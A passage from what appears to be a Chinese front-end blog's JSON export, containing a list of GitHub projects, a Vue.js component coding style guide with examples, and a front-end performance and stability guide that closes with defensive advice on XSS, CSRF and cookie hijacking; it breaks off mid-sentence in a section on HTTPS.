前端JQuery系列:源码剖析 https://github.com/JsAaron/jQuery avalon框架 https://github.com/RubyLouvre/avalon Microsoft ChakraCore 微软的Chakra引擎 https://github.com/Microsoft/ChakraCore Quintus HTML游戏引擎 https://github.com/cykod/Quintus 一个用node.js搭建的有趣博客 https://github.com/STRML/strml.net Web前端助手–FeHelper（Chrome扩展） https://github.com/zxlie/FeHelper 百度前端技术学院 https://github.com/baidu-ife/ife Cheerio（node.js中的jQuery） https://github.com/cheeriojs/cheerio nodejs的一个聊天软件 类似微信 https://github.com/BryanYang/freechat 使用html5和node.js构建的网易云音乐 https://github.com/stkevintan/Cube babel ES6转换为ES5 https://github.com/babel/babel 一个JS富文本编辑器 https://github.com/fex-team/ueditor 一个JS脑图可视化工具 https://github.com/fex-team/kityminder-core 一个JS写的Flappy Bird Game https://github.com/ellisonleao/clumsy-bird 一个JS写的GBA模拟器 https://github.com/taisel/IodineGBA SegmentFault写的Markdown解析器 https://github.com/SegmentFault/HyperDown.js 基于node.js的Ghost博客 https://github.com/TryGhost/Ghost 学习react的demos https://github.com/ruanyf/react-demos","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"前端资源","slug":"前端资源","permalink":"//www.shen.ee/tags/前端资源/"},{"name":"技术学习","slug":"技术学习","permalink":"//www.shen.ee/tags/技术学习/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"VueJS组件编码规范","slug":"VueJS组件编码规范","date":"2018-01-05T06:27:34.000Z","updated":"2021-11-15T07:55:36.538Z","comments":true,"path":"article/20899.html","link":"","permalink":"//www.shen.ee/article/20899.html","excerpt":"","text":"VueJS组件编码规范基于模块开发始终基于模块的方式来构建你的 app，每一个子模块只做一件事情。 Vue.js 的设计初衷就是帮助开发者更好的开发界面模块。一个模块是应用程序中独立的一个部分。 怎么做？每一个 Vue 组件（等同于模块）首先必须专注于解决一个单一的问题，独立的、可复用的、微小的 和 可测试的。 如果你的组件做了太多的事或是变得臃肿，请将其拆分成更小的组件并保持单一的原则。一般来说，尽量保证每一个文件的代码行数不要超过 100 行。也请保证组件可独立的运行。比较好的做法是增加一个单独的 demo 示例。 Vue 组件命名组件的命名需遵从以下原则： 有意义的: 不过于具体，也不过于抽象 简短: 2 到 3 个单词 具有可读性: 以便于沟通交流 同时还需要注意： 必须符合自定义元素规范: 使用连字符分隔单词，切勿使用保留字。 app- 前缀作为命名空间: 如果非常通用的话可使用一个单词来命名，这样可以方便于其它项目里复用。 为什么？ 组件是通过组件名来调用的。所以组件名必须简短、富有含义并且具有可读性。 如何做？123456789&lt;!-- 推荐 --&gt;&lt;app-header&gt;&lt;/app-header&gt;&lt;user-list&gt;&lt;/user-list&gt;&lt;range-slider&gt;&lt;/range-slider&gt;&lt;!-- 避免 --&gt;&lt;btn-group&gt;&lt;/btn-group&gt; &lt;!-- 虽然简短但是可读性差. 使用 `button-group` 替代 --&gt;&lt;ui-slider&gt;&lt;/ui-slider&gt; &lt;!-- ui 前缀太过于宽泛，在这里意义不明确 --&gt;&lt;slider&gt;&lt;/slider&gt; &lt;!-- 与自定义元素规范不兼容 --&gt; 组件表达式简单化Vue.js 的表达式是 100% 的 Javascript 表达式。这使得其功能性很强大，但也带来潜在的复杂性。因此，你应该尽量保持表达式的简单化。 为什么？ 复杂的行内表达式难以阅读。 行内表达式是不能够通用的，这可能会导致重复编码的问题。 IDE 基本上不能识别行内表达式语法，所以使用行内表达式 IDE 不能提供自动补全和语法校验功能。 怎么做？如果你发现写了太多复杂并难以阅读的行内表达式，那么可以使用 method 或是 computed 属性来替代其功能。 123456789101112131415161718192021222324252627282930&lt;!-- 推荐 --&gt;&lt;template&gt; &lt;h1&gt; &#123;&#123; `$&#123;year&#125;-$&#123;month&#125;` &#125;&#125; &lt;/h1&gt;&lt;/template&gt;&lt;script type=&quot;text/javascript&quot;&gt; export default &#123; computed: &#123; month() &#123; return this.twoDigits((new Date()).getUTCMonth() + 1); &#125;, year() &#123; return (new Date()).getUTCFullYear(); &#125; &#125;, methods: &#123; twoDigits(num) &#123; return (&apos;0&apos; + num).slice(-2); &#125; &#125;, &#125;;&lt;/script&gt;&lt;!-- 避免 --&gt;&lt;template&gt; &lt;h1&gt; &#123;&#123; `$&#123;(new Date()).getUTCFullYear()&#125;-$&#123;(&apos;0&apos; + ((new Date()).getUTCMonth()+1)).slice(-2)&#125;` &#125;&#125; &lt;/h1&gt;&lt;/template&gt; 组件 props 原子化虽然 Vue.js 支持传递复杂的 JavaScript 对象通过 props 属性，但是你应该尽可能的使用原始类型的数据。尽量只使用 JavaScript 原始类型（字符串、数字、布尔值）和函数。尽量避免复杂的对象。 为什么？ 使得组件 API 清晰直观。 只使用原始类型和函数作为 props 使得组件的 API 更接近于 HTML(5) 原生元素。 其它开发者更好的理解每一个 prop 的含义、作用。 传递过于复杂的对象使得我们不能够清楚的知道哪些属性或方法被自定义组件使用，这使得代码难以重构和维护。 怎么做？组件的每一个属性单独使用一个 props，并且使用函数或是原始类型的值。 123456789101112&lt;!-- 推荐 --&gt;&lt;range-slider :values=&quot;[10, 20]&quot; min=&quot;0&quot; max=&quot;100&quot; step=&quot;5&quot; :on-slide=&quot;updateInputs&quot; :on-end=&quot;updateResults&quot;&gt;&lt;/range-slider&gt;&lt;!-- 避免 --&gt;&lt;range-slider :config=&quot;complexConfigObject&quot;&gt;&lt;/range-slider&gt; 验证组件的 props在 Vue.js 中，组件的 props 即 API，一个稳定并可预测的 API 会使得你的组件更容易被其他开发者使用。 组件 props 通过自定义标签的属性来传递。属性的值可以是 Vue.js 字符串(:attr=&quot;value&quot; 或 v-bind:attr=&quot;value&quot;)或是不传。你需要保证组件的 props 能应对不同的情况。 为什么？验证组件 props 可以保证你的组件永远是可用的（防御性编程）。即使其他开发者并未按照你预想的方法使用时也不会出错。 怎么做？ 提供默认值。 使用 type 属性校验类型。 使用 props 之前先检查该 prop 是否存在。 123456789101112131415161718192021&lt;template&gt; &lt;input type=&quot;range&quot; v-model=&quot;value&quot; :max=&quot;max&quot; :min=&quot;min&quot;&gt;&lt;/template&gt;&lt;script type=&quot;text/javascript&quot;&gt; export default &#123; props: &#123; max: &#123; type: Number, // 这里添加了数字类型的校验 default() &#123; return 10; &#125;, &#125;, min: &#123; type: Number, default() &#123; return 0; &#125;, &#125;, value: &#123; type: Number, default() &#123; return 4; &#125;, &#125;, &#125;, &#125;;&lt;/script&gt; 将 this 赋值给 component 变量在 Vue.js 组件上下文中，this指向了组件实例。因此当你切换到了不同的上下文时，要确保 this 指向一个可用的 component 变量。 换句话说，如果你正在使用 ES6 的话，就不要再编写 var self = this; 这样的代码了，您可以安全地使用 Vue 组件。 为什么？ 使用 ES6，就不再需要将 this 保存到一个变量中了。 一般来说，当你使用箭头函数时，会保留 this 的作用域。（译者注：箭头函数没有它自己的 this 值，箭头函数内的 this 值继承自外围作用域。） 如果你没有使用 ES6，当然也就不会使用 箭头函数 啦，那你必须将 “this” 保存到到某个变量中。这是唯一的例外。 怎么做？123456789101112131415161718192021222324252627&lt;script type=&quot;text/javascript&quot;&gt;export default &#123; methods: &#123; hello() &#123; return &apos;hello&apos;; &#125;, printHello() &#123; console.log(this.hello()); &#125;, &#125;,&#125;;&lt;/script&gt;&lt;!-- 避免 --&gt;&lt;script type=&quot;text/javascript&quot;&gt;export default &#123; methods: &#123; hello() &#123; return &apos;hello&apos;; &#125;, printHello() &#123; const self = this; // 没有必要 console.log(self.hello()); &#125;, &#125;,&#125;;&lt;/script&gt; 组件结构化按照一定的结构组织，使得组件便于理解。 为什么？ 导出一个清晰、组织有序的组件，使得代码易于阅读和理解。同时也便于标准化。 按首字母排序 properties、data、computed、watches 和 methods 使得这些对象内的属性便于查找。 合理组织，使得组件易于阅读。（name; extends; props, data 和 computed; components; watch 和 methods; lifecycle methods 等）。 使用 name 属性。借助于 vue devtools 可以让你更方便的测试。 合理的 CSS 结构，如 BEM 或 rscss - 详情？。 使用单文件 .vue 文件格式来组件代码。 怎么做？组件结构化 12345678910111213141516171819202122232425262728293031323334353637&lt;template lang=&quot;html&quot;&gt; &lt;div class=&quot;Ranger__Wrapper&quot;&gt; &lt;!-- ... --&gt; &lt;/div&gt;&lt;/template&gt;&lt;script type=&quot;text/javascript&quot;&gt; export default &#123; // 不要忘记了 name 属性 name: &apos;RangeSlider&apos;, // 使用组件 mixins 共享通用功能 mixins: [], // 组成新的组件 extends: &#123;&#125;, // 组件属性、变量 props: &#123; bar: &#123;&#125;, // 按字母顺序 foo: &#123;&#125;, fooBar: &#123;&#125;, &#125;, // 变量 data() &#123;&#125;, computed: &#123;&#125;, // 使用其它组件 components: &#123;&#125;, // 方法 watch: &#123;&#125;, methods: &#123;&#125;, // 生命周期函数 beforeCreate() &#123;&#125;, mounted() &#123;&#125;, &#125;;&lt;/script&gt;&lt;style scoped&gt; .Ranger__Wrapper &#123; /* ... */ &#125;&lt;/style&gt; 组件事件命名Vue.js 提供的处理函数和表达式都是绑定在 ViewModel 上的，组件的每一个事件都应该按照一个好的命名规范来，这样可以避免不少的开发问题，具体可见如下 为什么。 为什么？ 开发者可以随意给事件命名，即使是原生事件的名字，这样会带来迷惑性。 过于宽松的事件命名可能与 DOM 模板不兼容。 怎么做？ 事件名也使用连字符命名。 一个事件的名字对应组件外的一组意义操作，如：upload-success、upload-error 以及 dropzone-upload-success、dropzone-upload-error （如果需要前缀的话）。 事件命名应该以动词（如 client-api-load） 或是 名词（如 drive-upload-success）结尾。（出处） 避免 this.$parentVue.js 支持组件嵌套，并且子组件可访问父组件的上下文。访问组件之外的上下文违反了基于模块开发的第一原则。因此你应该尽量避免使用 this.$parent。 为什么？ 组件必须相互保持独立，Vue 组件也是。如果组件需要访问其父层的上下文就违反了该原则。 如果一个组件需要访问其父组件的上下文，那么该组件将不能在其它上下文中复用。 怎么做？ 通过 props 将值传递给子组件。 通过 props 传递回调函数给子组件来达到调用父组件方法的目的。 通过在子组件触发事件来通知父组件。 谨慎使用 this.$refsVue.js 支持通过 ref 属性来访问其它组件和 HTML 元素。并通过 this.$refs 可以得到组件或 HTML 元素的上下文。在大多数情况下，通过 this.$refs来访问其它组件的上下文是可以避免的。在使用的的时候你需要注意避免调用了不恰当的组件 API，所以应该尽量避免使用 this.$refs。 为什么？ 组件必须是保持独立的，如果一个组件的 API 不能够提供所需的功能，那么这个组件在设计、实现上是有问题的。 组件的属性和事件必须足够的给大多数的组件使用。 怎么做？ 提供良好的组件 API。 总是关注于组件本身的目的。 拒绝定制代码。如果你在一个通用的组件内部编写特定需求的代码，那么代表这个组件的 API 不够通用，或者你可能需要一个新的组件来应对该需求。 检查所有的 props 是否有缺失的，如果有提一个 issue 或是完善这个组件。 检查所有的事件。子组件向父组件通信一般是通过事件来实现的，但是大多数的开发者更多的关注于 props 从忽视了这点。 Props向下传递，事件向上传递！。以此为目标升级你的组件，提供良好的 API 和 独立性。 当遇到 props 和 events 难以实现的功能时，通过 this.$refs来实现。 当需要操作 DOM 无法通过指令来做的时候可使用 this.$ref 而不是 JQuery、document.getElement*、document.queryElement。 12345&lt;!-- 推荐，并未使用 this.$refs --&gt;&lt;range :max=&quot;max&quot; :min=&quot;min&quot; @current-value=&quot;currentValue&quot; :step=&quot;1&quot;&gt;&lt;/range&gt; 123456789101112131415161718192021222324252627282930313233&lt;!-- 使用 this.$refs 的适用情况--&gt;&lt;modal ref=&quot;basicModal&quot;&gt; &lt;h4&gt;Basic Modal&lt;/h4&gt; &lt;button class=&quot;primary&quot; @click=&quot;$refs.basicModal.hide()&quot;&gt;Close&lt;/button&gt;&lt;/modal&gt;&lt;button @click=&quot;$refs.basicModal.open()&quot;&gt;Open modal&lt;/button&gt;&lt;!-- Modal component --&gt;&lt;template&gt; &lt;div v-show=&quot;active&quot;&gt; &lt;!-- ... --&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; // ... data() &#123; return &#123; active: false, &#125;; &#125;, methods: &#123; open() &#123; this.active = true; &#125;, hide() &#123; this.active = false; &#125;, &#125;, // ... &#125;;&lt;/script&gt; 12345678910111213141516171819&lt;!-- 如果可通过 emited 来做则避免通过 this.$refs 直接访问 --&gt;&lt;template&gt; &lt;range :max=&quot;max&quot; :min=&quot;min&quot; ref=&quot;range&quot; :step=&quot;1&quot;&gt;&lt;/range&gt;&lt;/template&gt;&lt;script&gt; export default &#123; // ... methods: &#123; getRangeCurrentValue() &#123; return this.$refs.range.currentValue; &#125;, &#125;, // ... &#125;;&lt;/script&gt; 使用组件名作为样式作用域空间Vue.js 的组件是自定义元素，这非常适合用来作为样式的根作用域空间。可以将组件名作为 CSS 类的命名空间。 为什么？ 给样式加上作用域空间可以避免组件样式影响外部的样式。 保持模块名、目录名、样式根作用域名一样，可以很好的将其关联起来，便于开发者理解。 怎么做？使用组件名作为样式命名的前缀，可基于 BEM 或 OOCSS 范式。同时给 style 标签加上 scoped 属性。加上 scoped 属性编译后会给组件的 class 自动加上唯一的前缀从而避免样式的冲突。 123456789&lt;style scoped&gt; /* 推荐 */ .MyExample &#123; &#125; .MyExample li &#123; &#125; .MyExample__item &#123; &#125; /* 避免 */ .My-Example &#123; &#125; /* 没有用组件名或模块名限制作用域, 不符合 BEM 规范 */&lt;/style&gt; 提供组件 API 文档使用 Vue.js 组件的过程中会创建 Vue 组件实例，这个实例是通过自定义属性配置的。为了便于其他开发者使用该组件，对于这些自定义属性即组件API应该在 README.md 文件中进行说明。 为什么？ 良好的文档可以让开发者比较容易的对组件有一个整体的认识，而不用去阅读组件的源码，也更方便开发者使用。 组件配置属性即组件的 API，对于组件的用户来说他们更感兴趣的是 API 而不是实现原理。 正式的文档会告诉开发者组件 API 变更以及向后的兼容性情况。 README.md 是标准的我们应该首先阅读的文档文件。代码托管网站（GitHub、Bitbucket、Gitlab 等）会默认在仓库中展示该文件作为仓库的介绍。 怎么做？在模块目录中添加 README.md 文件： 1234range-slider/├── range-slider.vue├── range-slider.less└── README.md 在 README 文件中说明模块的功能以及使用场景。对于 vue 组件来说，比较有用的描述是组件的自定义属性即 API 的描述介绍。 Range slider功能range slider 组件可通过拖动的方式来设置一个给定范围内的数值。 该模块使用 noUiSlider 来实现跨浏览器和 touch 功能的支持。 如何使用&lt;range-slider&gt; 支持如下的自定义属性： attribute type description min Number 可拖动的最小值. max Number 可拖动的最大值. values Number[] optional 包含最大值和最小值的数组. 如. values=&quot;[10, 20]&quot;. Defaults to [opts.min, opts.max]. step Number optional 增加减小的数值单位，默认为 1. on-slide Function optional 用户拖动开始按钮或者结束按钮时的回调函数，函数接受 (values, HANDLE) 格式的参数。 如： on-slide={ updateInputs }, component.updateInputs = (values, HANDLE) =&gt; { const value = values[HANDLE]; }. on-end Function optional 当用户停止拖动时触发的回调函数，函数接受 (values, HANDLE) 格式的参数。 如需要自定义 slider 的样式可参考 noUiSlider 文档 提供组件 demo添加 index.html 文件作为组件的 demo 示例，并提供不同配置情况的效果，说明组件是如何使用的。 为什么？ demo 可以说明组件是独立可使用的。 demo 可以让开发者预览组件的功能效果。 demo 可以展示组件各种配置参数下的功能。 对组件文件进行代码校验代码校验可以保持代码的统一性以及追踪语法错误。.vue 文件可以通过使用 eslint-plugin-html插件来校验代码。你可以通过 vue-cli 来开始你的项目，vue-cli 默认会开启代码校验功能。 为什么？ 保证所有的开发者使用同样的编码规范。 更早的感知到语法错误。 怎么做？为了校验工具能够校验 *.vue文件，你需要将代码编写在 &lt;script&gt;标签中，并使组件表达式简单化，因为校验工具无法理解行内表达式，配置校验工具可以访问全局变量 vue 和组件的 props。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"前端优化不完全指南","slug":"前端优化不完全指南","date":"2017-11-30T02:27:34.000Z","updated":"2021-11-15T07:55:36.543Z","comments":true,"path":"article/6839.html","link":"","permalink":"//www.shen.ee/article/6839.html","excerpt":"","text":"前端优化不完全指南1 工作效率你是否经常处于这样的场景：从早上忙到晚上八九点，一会与产品经理沟通，一会在部门群聊一下新奇的东西，一会被设计美眉纠缠住拖不了身，有时还开不了部门的会议因为页面急着上线，然后继续加班~~~ 怎么提高我们的工作效率？下面从四个方面讲解： 时间管理 利用工具 经验和阅历 使用新技术 1.1 时间管理凡是时间管理，都会联想到计划这个词。我们先看看别人家的月计划表和周计划表，之所以周计划表为空，是希望你能把它下载并打印出来，行动从计划开始：月计划表：周计划表： 当然计划不要做得过于琐碎，且不要占用自己太多时间。做好计划之余，在执行过程中需要注意几点： 正确的时间点做正确的事，比如早上比较精神，可选择比较难的项目开展，可容易达到高效率。 专注一件事情，尽量不要被琐碎或其他事情影响，而且不要频繁地去看计划表，最好是做完一件再去看，否则容易焦虑导致无法专心。 1.2 利用工具第一样工具，比如程序员杯子： 利用工具有什么好处呢？ 减少重复性工作。 减少繁琐工作流程，一键式化。 1.2.1 编辑器选择好一个前端编辑器是比较重要的。目前sublime、webstorm和vim是比较常见的，建议不使用Dreamweaver。sublime目前还是不错的选择，可以安装插件，比如BracketHighlighter 高亮显示、JsFormat、Emmet html/CSS快速编辑以及DocBlockr插件，快速输入jsDoc注释等，还可以自定义代码段snippets。无论你使用哪种编辑器，你需要的是熟悉这个编辑器并熟练它的快捷键。 1.2.2 浏览器开发者工具作为前端人员，首选的浏览器当然是chrome。推荐阅读Chrome开发者工具不完全指南一系列文章，它从一些基础的功能开始到它的一些高级性能分析器（Timeline、Profiles），熟悉chrome对我们的开发工作有很大的作用。 1.2.3 其他常用工具切图工具：photoshop cc切图之智能切图、 cutterman量色、测距工具：FastStone Capture、马克鳗 - 设计稿标注图片压缩：tinypng、智图生成雪碧图：spritebox、CSS Sprite Generator、cssgaga调试工具：Fiddler 、weinre 、微信调试工具； 1.2.4 前端工程化凡是重复的，必须使用工具自动完成。工具众多，我们就有一种想法，能不能有一种工具能帮我们自动生成雪碧图、 css压缩、图片压缩等等，然后就出现了前端工程化。前端工程化一般可分为五个步骤：（1） 初始，生成基础目录结构和样式库。（2） 开发，实时预览、预编译。（3） 构建，预编译、合并、压缩。（4） 发布，将构建后静态文件发布上线。（5） 打包，资源路径转换，源码打包 。 这里推荐一个工具fis，解决前端开发中自动化工具、性能优化、模块化框架、开发规范、代码部署、开发流程等问题。还有凹凸实验室研发的athena，O2Team构建项目流程工具，可以生成相应目录和代码，同时对项目进行编译， 一次安装，到处运行。 1.3 阅历和经验我所理解的程序员兼并聪明以及“懒惰”精神，推崇懒惰式开发，即把问题理解清楚，确保将要写的代码能真正的解决问题，这将会避免之后写出大量无用的代码，正所谓“懒”出效率。我们的阅历和经验可以大大提高开发效率，思考代码的时间增加从而选出最优方案，因此写代码速度更快以及代码长度更短，对问题的透彻理解使调试代码的速度也更快。根据阅历和经验，或借助其他人的，我们进行整理从而形成自己或团队的规范，这可大大提高我们的写码速度。 1.4 使用新技术使用新技术如何提高我们的工作效率。一贯我们都使用我们熟悉的技术去开发一个技术处理方案，毕竟学习新技术的时间成本还是存在的。但是还是不能忽略一些新技术的存在，一般新技术包含了一些很棒的新特性，可以更加方便的实现很多复杂的操作，提高开发人员的效率，比如ES6。用你的慧眼去积累新技术，会派上用场的。 2 速度性能为什么需要前端性能优化？性能优化可以从哪几个方面入手？遇到一个页面，5秒还没加载完成，那个菊花转啊转，或者页面完全白屏，那简直把人逼疯了。从用户体验的角度看，前端性能优化是非常有必要的。网页最长加载时间一般不能超过3秒。首先我们需要确定网页的性能指标，可量化的目标以及可持续跟踪的优化数据是性能优化工作得以持续进行的保障，同时也是源动力！比如： 首屏加载时长 DOM加载时长 页面白屏时长 我们一般通过三种方式来检验我们的网页性能： 通过浏览器开发者工具或浏览器插件、Fiddler、Charles等查看页面加载情况。原理是通过追踪HTTP请求与响应的时间，以图形的方式列出所有资源的下载情况。缺点是人为操作，难以实现批量测试与统计。 在页面中引入额外的代码钩子来记录时间等相关数据。缺点是加重了开发者与测试人员的负担，还有可能因为检测代码本身的潜在问题影响页面的性能。如果好一点的话，会接入一个性能数据收集系统，采取并分析数据。 使用第三方的工具如Page Speed、YSlow和WebPagetest，能够选择在不同浏览器和不同地域进行测试，并且给出各方面的评分以及提供一些优化建议。但某些服务需要排队等待，并且难以实现批量测试与统计。下面是使用WebPagetest测试京东首页的情况： 可喜可贺，W3C推出了一套性能API标准，目的是简化开发者对网站性能进行精确分析与控制的过程，最终实现性能的提高。比如通过Navigation Timing记录的关键时间点来统计页面完成所用的时间，部分使用方法： 123456var timing = window.performance.timingtiming.domLoading //浏览器开始解析 HTML 文档第一批收到的字节timing.domInteractive // 浏览器完成解析并且所有 HTML 和 DOM 构建完毕timing.domContentLoadedEventStart //DOM 解析完成后，网页内资源加载开始的时间timing.domContentLoadedEventEnd // DOM 解析完成后，网页内资源加载完成的时间（如 JS 脚本加载执行完毕）timing.domComplete //网页上所有资源（图片等）下载完成,且准备就绪的时间 持续追踪性能数据，要选择合适的页面性能测量工具或API，一旦选定后，不再更换，以保证历史数据的可参照性。我们还要形成一种意识，达成性能联盟小组，对于重要的业务或者页面，一定要从性能的角度考虑问题，有理有据地拒绝有损于前端性能的业务需求或改动。 人人都知道雅虎军规，那我就来个截图吧！ 以下，我们从服务端、网络、客户端三个方面来一一突破速度性能的提升。 2.1 没事少烦我-服务端2.1.1 使用内容分发网络（Content Delivery Network，CDN）通过在现有的Internet中增加一层新的网络架构，将网站的内容发布到最接近用户的 cache服务器内，通过DNS负载均衡的技术，判断用户来源就近访问cache服务器取得所需的内容。深圳用户访问遥远的美国服务器，当然不理想了。把静态内容分布到CDN可以减少用户响应时间20%或更多。 2.1.2 静态资源缓存，移动端离线缓存如果可以减少服务端的负担，在应用离线时可使用资源或加载资源更快，岂不乐哉？缓存利用可包括：添加 Expires 头，配置 ETag，使 Ajax 可缓存等。其实，恰当的缓存设置可以大大的减少 HTTP请求，也可以节省带宽 。 配置 ETag：即If-None-Match: 上次 ETag 的内容。浏览器会发出请求询问服务端，资源是否过期；服务端发现,没有过期，直接返回一个状态码为 304、正文为空的响应，告知浏览器使用本地缓存；如果资源有更新，服务端返回状态码 200、Etag 和正文。这个过程被称之为 HTTP 的协商缓存，通常也叫做弱缓存。 添加 Expires 头：服务端通过响应头告诉浏览器，在什么时间之前（Expires）或在多长时间之内（Cache-Control: Max-age=xxx），不要再请求服务器了。这个机制我们通常称之为 HTTP 的强缓存。一般会对 CSS、JS、图片等资源使用强缓存，而入口文件（HTML）一般使用协商缓存或不缓存。 AppCache： AppCache主要利用manifest 文本文件，告知浏览器被缓存的内容以及不缓存的内容。 manifest 文件可分为三个部分：（1） CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存，等价于CACHE（2） NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存（3） FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面 使用AppCache方案的步骤：（1） 整理出需要缓存的静态文件列表，如juqery.js和gb.css。（2） 配置服务器支持。（3） 确定内容更新机制和浏览器兼容方案。 LocalStorage：用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 2.2 省着点用-网络2.2.1 减少请求数可通过以下方式减少请求数： 小图片合并雪碧图； JS、CSS文件选择性合并； 避免重复的资源请求。 减少请求数对于速度优化来说最重要最有效的，特别是网络差的用户。一个完整的请求需要经过域名解析以及DNS寻址、与服务器建立连接、发送数据、等待服务器响应、接收数据的过程；每个请求都需要携带数据，因此每个请求都需要占用带宽；浏览器进行并发请求的请求数是有上限的。请求多了的情况，明显增加了网页的响应时间。一个页面由多个模块拼接而成，几个模块中请求了同样的资源时，就会导致资源的重复请求。 2.2.2 减少文件大小（减少请求带宽） 压缩CSS、JS、图片； 尽可能控制DOM节点数； 精简css、 JavaScript，移除注释、空格、重复css和脚本。 开启Gzip，Gzip的思想就是把文件先在服务器端进行压缩，且压缩率达到85%，然后再传输，传输完毕后浏览器会 重新对压缩过的内容进行解压缩，并执行。。好处在于Gzip的支持已经很好，且爬虫可识别，压缩率达到66%-85%显著减少了文件传输的大小。另外，gzip对pdf文件的压缩效果不大，而且会浪费CPU。 2.2.3 合理使用静态资源域名域名的要求是短小且独立。短小可以减少头部开销，因为域名越短请求头起始行的 URI 就越短。之所以要求独立，因为独立域名不会共享主域的 Cookie，可以有效减小请求头大小，这个策略一般称之为 Cookie-Free Domain；另外一个原因是浏览器对相同域名的并发连接数限制，一般允许同域名并发 6~8 个连接，域名不是越多越好，每个域名的第一个连接都要经历 DNS 查询（DNS Lookup），导致会耗费一定的时间，控制域名使用在2-4个之间。另外注意：同一静态资源在不同页面被散列到不同子域下，会导致无法利用 HTTP 缓存。 2.2.4 使用HTTP 2HTTP 2 相比 HTTP 1.1 的更新大部分集中于： 多路复用：多路复用很好地解决如何让重要资源尽快加载这个问题。同域名下或者不同域但是同时满足同一个 IP以及使用同一个证书的这两个条件中的所有通信都在单个连接上完成，此连接上同时打开任意数量的双向数据流（ HTTP 1.1 有连接数限制）。使用多域名加上相同的 IP 和证书部署 Web 服务有特殊的意义：让支持 HTTP/2 的终端只建立一个连接，用上 HTTP/2 协议带来的各种好处；而只支持 HTTP/1.1 的终端则会建立多个连接，达到同时更多并发请求的目的。 HEAD 压缩：HTTP/2 将请求和响应数据分割为更小的帧，并对它们采用二进制编码（ Binary Framing ）。在 HTTP/1 中，HTTP 请求和响应都是由「状态行、请求 / 响应头部、消息主体」三部分组成，状态行和头部却没有经过任何压缩，直接以纯文本传输。如下图的比较：在 HTTP/2 中，每个数据流都以消息的形式发送，而消息又由一个或多个帧组成。多个帧之间可以乱序发送，因为根据帧首部的流标识可以重新组装。 请求优先级：服务器可以根据流的优先级，控制资源分配(CPU、内存、带宽)，而在响应数据准备好之后，优先将最高优先级的帧发送给客户端。 服务器推送：启动Server Push，意味着服务端可以在发送页面HTML时主动推送其它资源，有自己独立的URL，可以被浏览器缓存；如果服务端推送的资源已经被浏览器缓存过，浏览器可以通过发送 RST_STREAM 帧来拒收。 2.2 学会持家，让家变得简洁漂亮-客户端 使用外链CSS和JS，CSS放头，JS放尾，防止阻塞以减少对并发下载的影响，尽早刷新文档的输出。 html的代码优化，如： 避免空的图片src； 协议自适应，减少html文件大小，将https://和http://都替换成//。 css的代码优化，如： 建议使用类选择器，访问比较快； 不建议使用很长的base64； 避免CSS表达式； 避免使用Filters。 js的代码优化，如： 避免使用eval和width； 减少作用域链查找； 减少DOM访问，尽量缓存DOM； 充分利用事件委托； 减少Repaint（重绘）和Reflow（重排）最好通过批量更新元素减少重排次数，如设置类class统一更新样式，在添加多个li 元素将会触发多次页面重排的情况下使用 DOM fargment 在内存中创建完整的 DOM 节点，然后再一次性添加到 DOM 中。 图片格式的选择： 颜色较为丰富的图片而且文件比较大的（40KB - 200KB）或者有内容的图片优先考虑 jpg；图标等颜色比较简单、文件体积不大、起修饰作用的图片，优先考虑使用 PNG8 格式；图像颜色丰富而且图片文件不太大的（40KB 以下）或有半透明效果的优先考虑 PNG24 格式。 条件允许的，使用新格式WEBP和BPG。 用SVG和ICONFONT代替简单的图标。 用字蛛来代替艺术字体切图，它可剔除没有使用的字符，从而解决中文字体过大的问题，并编码成跨平台兼容的格式。 合理分配资源加载时间，按需加载，包括CSS、JS文件以及图片、业务模块等。 ​ 根据我们网页最初加载需要的最小内容集推断其他内容延迟加载；无条件提前加载公共内容或根据用户行为推断提前加载某些内容，如根据搜索框输入的文字来判断加载的内容。加载机制如下： 预加载 Dom Ready后加载 onLoad后加载 滚动加载 减少DNS 查询：DNS 查询一般需要几毫秒到几百毫秒，移动环境下会更慢。我们可以预先读取DNS，减少用户等待时间。 3 稳定性稳定性的第一要求是可用。最起码的要求是页面得出来，要不然没法用了。其次讲究的是页面的可维护性，假如页面挂了，多久可以恢复过来，另外考虑页面挂的期间是否可以采取静态页面处理等方式。页面的稳定性其实和前端安全挂钩，即使页面可以出来了，但是不能保证不会被黑掉，下文从前端安全的方面讲解。 3.1 常见攻击： XSS (Cross Site Script) ，跨站脚本攻击，往Web页面里插入恶意html代码。特点是攻击者的代码必须能获取用户浏览器端的执行权限，要杜绝此类攻击出现可以在入口和出口进行严格的过滤。三种类型：（1） 反射型XSS：一次性；将包含注入脚本的恶意链接发送给受害者。（2） 持久型XSS：用户输入的数据“存储”在服务器端，比如一条包含XSS代码的留言。（3） DOM XSS：使用一些eval等有输出的语句意味着多了一份被XSS的风险。 应对策略： 当恶意代码值被作为某一标签的内容显示：在不需要html输入的地方对html 标签及一些特殊字符( ” &lt; &gt; &amp; 等等 )做过滤，将其转化为不被浏览器解释执行的字符。 当恶意代码被作为某一标签的属性显示，通过用 “将属性截断来开辟新的属性或恶意方法：属性本身存在的 单引号和双引号都需要进行转码；对用户输入的html 标签及标签属性做白名单过滤，也可以对一些存在漏洞的标签和属性进行专门过滤。 CSRF(Cross Site Request Forgery)，跨站点伪造请求，通过伪造连接请求在用户不知情的情况下，让用户以自己的身份来完成攻击者需要达到的一些目的。 cookie劫持，通过获取页面的权限，在页面中写一个简单的到恶意站点的请求，并获取用户的cookie登录某些站点。 对于crsf 和cookie 劫持的策略： 通过 referer、token 或者 验证码 来检测用户提交。 尽量不要在页面的链接中暴露用户隐私信息。 对于用户修改删除等操作最好都使用post 操作 。 避免全站通用的cookie，严格设置cookie的域。 3.2 数据通道安全国内的众多网站都没有实现全站HTTPS。这是目前为止最重要的一步，所有的数据在发送之前就会被加密，攻击者无法查看或篡改数据包的内容。HTTPS可以理解为HTTP+SSL/TLS，通过数据加密、校验数据完整性和身份认证三种机制来保障安全。HTTPS的缺点是网站在加上TLS证书时，可能导致RTT往返时延增加，并且 